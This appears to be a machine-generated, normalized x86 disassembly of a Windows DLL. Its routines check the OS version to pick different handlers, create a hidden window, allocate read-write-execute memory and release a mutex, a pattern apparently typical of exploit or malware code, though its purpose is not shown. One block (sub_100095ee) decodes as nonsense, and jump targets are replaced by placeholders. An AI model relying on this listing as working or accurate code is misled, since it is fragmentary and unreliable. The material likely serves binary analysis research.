mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x3c ] edi
xor edx edx
mov [ ebp - 0x34 ] edx
mov ecx 0x220
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_1000899f
jmp r-xdata
mov eax [ edi + 0x68 ]
mov eax [ eax + edx * 8 ]
mov [ ebp - 0x38 ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edx
mov [ ebp - 0x34 ] edx
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx ecx
jne r-xdata
cmp edx [ edi + 0x4c ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] ecx
and [ ebp - 0x20 ] 0x0
sub_100089de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x38 ] edi
xor edx edx
push 0xffffffe1
cmp [ ebp - 0x20 ] ebx
je r-xdata
mov eax edx
shl eax 0x3
mov ecx [ edi + 0x90 ]
mov ecx [ eax + ecx ]
mov [ ebp - 0x3c ] ecx
cmp [ ecx + 0x1 ] 0x2
jb r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x44 ] eax
cmp eax ebx
jne r-xdata
xor edx edx
inc edx
jmp r-xdata
cmp [ ecx + 0x8 ] 0x20
jne r-xdata
lea ecx [ edi + 0xd0 ]
push ecx
push [ edi + 0x78 ]
push [ edi + 0x90 ]
call eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
push 0xffffffe0
jmp r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov eax edx
shl eax 0x3
mov ecx [ edi + 0x90 ]
mov ecx [ eax + ecx ]
mov [ ebp - 0x40 ] ecx
cmp [ ecx + 0x1 ] 0x2
jb r-xdata
mov [ ebp - 0x34 ] edx
cmp edx [ edi + 0x78 ]
jae r-xdata
add ecx 0xc
cmp [ ecx ] 0x220
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
pop eax
mov [ ebp - 0x4 ] ebx
call sub_10008bec
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ ecx + 0x8 ] 0x20
jne r-xdata
mov [ esi + 0x4 ] ecx
mov ecx [ ecx ]
mov [ esi + 0x8 ] ecx
mov ecx [ edi + 0x90 ]
lea ecx [ eax + ecx + 0x4 ]
mov [ esi + 0xc ] ecx
mov ecx [ edi + 0x90 ]
mov ecx [ eax + ecx + 0x4 ]
mov [ esi + 0x10 ] ecx
mov ecx [ edi + 0x90 ]
mov [ eax + ecx + 0x4 ] 0x7
mov [ ebp - 0x20 ] ebx
inc edx
jmp r-xdata
add ecx 0xc
mov ebx [ ecx ]
and ebx 0xff0
cmp ebx 0x220
jne r-xdata
mov [ ebp - 0x34 ] edx
cmp edx [ edi + 0x78 ]
jae r-xdata
xor ebx ebx
mov [ esi + 0x4 ] ecx
mov edx [ ecx ]
mov [ esi + 0x8 ] edx
mov edx [ edi + 0x90 ]
lea edx [ eax + edx + 0x4 ]
mov [ esi + 0xc ] edx
mov edx [ edi + 0x90 ]
mov edx [ eax + edx + 0x4 ]
mov [ esi + 0x10 ] edx
mov [ ecx ] ebx
mov ecx [ edi + 0x90 ]
mov [ eax + ecx + 0x4 ] 0x7
xor ebx ebx
mov [ ebp - 0x20 ] ebx
jmp r-xdata
sub_10008c2b
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ eax ] 0x0
push ebx
push edi
push 0x18
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_1000d316
mov eax [ ebp + 0xc ]
add esp 0xc
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
mov al [ ebp + 0x14 ]
mov [ ebp - 0xc ] al
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x8 ] eax
call [ GetVersion@IAT ]
mov ebx eax
push 0xffffffbe
movzx eax bl
sub eax 0x4
pop edi
je r-xdata
push 0xffffffe6
pop eax
jmp r-xdata
call sub_1000c680
test al al
je r-xdata
dec eax
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x18 ]
push 0x18
push eax
push sub_10008d5f
push 0xffffffe2
pop edi
jmp r-xdata
mov esi 0x9c
lea eax [ ebp - 0xb4 ]
push esi
push 0x0
push eax
call sub_1000d316
add esp 0xc
lea eax [ ebp - 0xb4 ]
mov [ ebp - 0xb4 ] esi
push eax
call [ GetVersionExA@IAT ]
xor eax eax
mov al bh
movzx eax al
sub eax 0x0
je r-xdata
dec eax
jne r-xdata
mov eax edi
pop edi
pop ebx
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x18 ]
push 0x18
push eax
push sub_10008e9a
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x18 ]
push 0x18
push eax
push sub_100094e5
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
call sub_100096ce
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp - 0x20 ] 0x2
lea eax [ ebp - 0x18 ]
push 0x18
push eax
jae r-xdata
dec eax
jne r-xdata
push sub_10009185
jmp r-xdata
push sub_10008fd5
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
lea eax [ ebp - 0x18 ]
push 0x18
push eax
je r-xdata
push sub_10009335
jmp r-xdata
sub_10008d5f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
mov edi [ eax + 0x108 ]
mov [ ebp - 0x30 ] edi
xor eax eax
mov [ ebp - 0x2c ] eax
push 0xffffffec
pop eax
jmp r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ edi + 0x48 ]
mov ebx [ ecx + eax * 8 ]
mov [ ebp - 0x34 ] ebx
push [ esi + 0x4 ]
push ebx
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x2c ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebx + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
jmp r-xdata
and [ ebp - 0x38 ] 0x0
cmp eax [ edi + 0x30 ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + ebx ] ecx
inc [ ebp - 0x38 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x2c ]
shl eax 0x3
mov ecx [ edi + 0x48 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ edi + 0x48 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ ebx + 0x1 ]
cmp [ ebp - 0x38 ] eax
jae r-xdata
sub_10008e9a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
mov edi [ eax + 0x12c ]
mov [ ebp - 0x30 ] edi
xor eax eax
mov [ ebp - 0x2c ] eax
push 0xffffffec
pop eax
jmp r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ edi + 0x58 ]
mov ebx [ ecx + eax * 8 ]
mov [ ebp - 0x34 ] ebx
push [ esi + 0x4 ]
push ebx
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x2c ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebx + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
jmp r-xdata
and [ ebp - 0x38 ] 0x0
cmp eax [ edi + 0x3c ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + ebx ] ecx
inc [ ebp - 0x38 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x2c ]
shl eax 0x3
mov ecx [ edi + 0x58 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ edi + 0x58 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ ebx + 0x1 ]
cmp [ ebp - 0x38 ] eax
jae r-xdata
sub_10008fd5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_10009146
jmp r-xdata
mov ecx [ ebx + 0x5c ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x40 ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x3
mov ecx [ ebx + 0x5c ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebx + 0x5c ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_10009185
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_100092f6
jmp r-xdata
mov ecx [ ebx + 0x68 ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x4c ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x3
mov ecx [ ebx + 0x68 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebx + 0x68 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_10009335
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_100094a6
jmp r-xdata
mov ecx [ ebx + 0x68 ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x4c ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x3
mov ecx [ ebx + 0x68 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebx + 0x68 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_100094e5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x90 ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1000968f
jmp r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x48 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
lea ecx [ ebx + 0xd0 ]
push ecx
push [ ebx + 0x78 ]
push [ ebx + 0x90 ]
call eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
push 0xffffffe0
jmp r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x78 ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
lea eax [ ebx + 0x90 ]
mov ecx [ ebp - 0x38 ]
shl ecx 0x3
mov edx [ eax ]
mov edx [ edx + ecx + 0x4 ]
mov [ esi + 0x14 ] edx
mov eax [ eax ]
mov edx [ esi + 0x10 ]
mov [ eax + ecx + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_100095ee
mov esp 0x458b1873
mov esp 0x885048d
add [ eax ] al
add [ ebx + 0xc8b084e ] cl
or [ ecx + 0x45ff380c ] cl
mov esp 0x7e80dfeb
or al 0x0
je r-xdata
and [ ebp - 0x24 ] 0x0
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
lea eax [ ebx + 0x90 ]
mov ecx [ ebp - 0x38 ]
shl ecx 0x3
mov edx [ eax ]
mov edx [ edx + ecx + 0x4 ]
mov [ esi + 0x14 ] edx
mov eax [ eax ]
mov edx [ esi + 0x10 ]
mov [ eax + ecx + 0x4 ] edx
and [ ebp - 0x4 ] 0x0
call sub_1000968f
jmp r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x48 ] eax
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
lea ecx [ ebx + 0xd0 ]
push ecx
push [ ebx + 0x78 ]
push [ ebx + 0x90 ]
call eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
push 0xffffffe0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
pop eax
sub_100096ce
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
call [ GetVersion@IAT ]
movzx ecx al
mov [ ebp - 0x28 ] ecx
xor ecx ecx
mov cl ah
movzx eax cl
mov [ ebp - 0x20 ] eax
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push 0x88000000
push rw-data
push rw-data
push esi
call [ CreateWindowExW@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi esi
jne r-xdata
push 0x57
jmp r-xdata
push 0x40
mov eax 0x1000
push eax
push eax
push esi
call [ VirtualAlloc@IAT ]
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx esi
jne r-xdata
push 0xffffffd3
jmp r-xdata
pop eax
jmp r-xdata
call sub_100098c4
mov [ ebp - 0x34 ] eax
cmp eax esi
jne r-xdata
push 0xffffffd8
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x30 ] 0xffffffff
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x28 ]
sub eax 0x4
je r-xdata
push 0xffffffbf
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000a0fc
dec eax
je r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
dec eax
jne r-xdata
cmp [ ebp - 0x20 ] 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000b46f
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_10009801
mov eax [ ebp - 0x30 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000b73a
jmp r-xdata
call sub_1000a2cd
jmp r-xdata
call sub_1000ab6f
jmp r-xdata
add esp 0x14
mov [ ebp - 0x30 ] eax
sub_10009801
cmp [ ebp - 0x34 ] esi
je r-xdata
cmp edi esi
je r-xdata
push [ ebp - 0x34 ]
call [ ReleaseMutex@IAT ]
push [ ebp - 0x34 ]
call [ CloseHandle@IAT ]
cmp ebx esi
je r-xdata
push edi
call [ DestroyWindow@IAT ]
retn
push 0x8000
push esi
push ebx
call [ VirtualFree@IAT ]
sub_10009835
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
test edi edi
jbe r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
add eax esi
mov edx ecx
shr edx 0x8
mov [ eax ] cl
mov [ eax + 0x1 ] dl
mov edx ecx
pop edi
shr edx 0x10
shr ecx 0x18
mov [ eax + 0x2 ] dl
mov [ eax + 0x3 ] cl
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x1c ]
add eax esi
mov edx ecx
shr edx 0x8
mov [ eax ] cl
mov [ eax + 0x1 ] dl
mov edx ecx
pop esi
shr edx 0x10
shr ecx 0x18
mov [ eax + 0x2 ] dl
